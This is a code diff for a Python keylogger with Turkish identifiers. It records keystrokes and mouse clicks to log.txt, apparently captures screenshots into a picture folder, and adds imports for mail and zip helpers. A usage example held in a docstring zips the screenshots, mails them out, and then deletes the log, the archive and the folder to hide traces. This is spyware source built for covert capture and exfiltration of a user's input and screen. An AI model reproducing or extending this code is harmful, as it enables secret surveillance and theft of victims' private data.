@@ -2,6 +2,19 @@ import os
 from pynput.keyboard import Key, Listener
 from pynput.mouse import Listener
 import pyautogui
+import mail
+import file_to_zip as zipper
+import shutil
+"""
+# Kullanım örneği
+zipper.klasoru_zip_yap("./picture", "picture.zip")
+
+mail.gönder()
+
+os.remove("log.txt")
+os.remove("picture.zip")
+shutil.rmtree("picture")
+"""
 
 check = os.path.exists("./log.txt")
 
@@ -26,7 +39,6 @@ def on_click(x, y, button, pressed):
         yazi = "\nfare kordinatları => x = {} , y = {} \t Tuş => {} ".format(x,y,button)
         
         yaz(yazi)
-
 
         icindekiler = os.listdir('./picture/')
         sayi = len(icindekiler)
